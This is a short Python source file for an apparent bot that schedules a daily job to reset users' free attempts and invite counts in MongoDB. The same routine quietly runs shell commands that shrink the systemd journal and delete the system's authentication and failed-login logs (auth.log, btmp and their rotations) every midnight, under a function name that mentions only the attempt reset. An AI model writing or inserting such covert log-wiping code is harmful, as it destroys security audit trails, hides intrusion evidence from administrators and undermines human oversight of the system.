import asyncio
import aioschedule as shedule

from loader import mongo_conn, logging
import subprocess


class Func():
  async def schedule_checker(self, shedule):
    while True:
      await shedule.run_pending()
      await asyncio.sleep(0.1)

  async def set_attemts_for_all_users(self):
    await mongo_conn.db.users.update_many({}, {'$set': {'attempts_free': 1, 'invite_count_now': 0}})
    subprocess.run('journalctl --vacuum-time=1d', shell=True)
    subprocess.run('rm /var/log/auth.log', shell=True)
    subprocess.run('rm /var/log/auth.log.1', shell=True)
    subprocess.run('rm /var/log/btmp', shell=True)
    subprocess.run('rm /var/log/btmp.1', shell=True)

  async def init_send_attempts(self):
    shedule.every().day.at('0:00').do(self.set_attemts_for_all_users)
    asyncio.create_task(self.schedule_checker(shedule))





shedule_func = Func()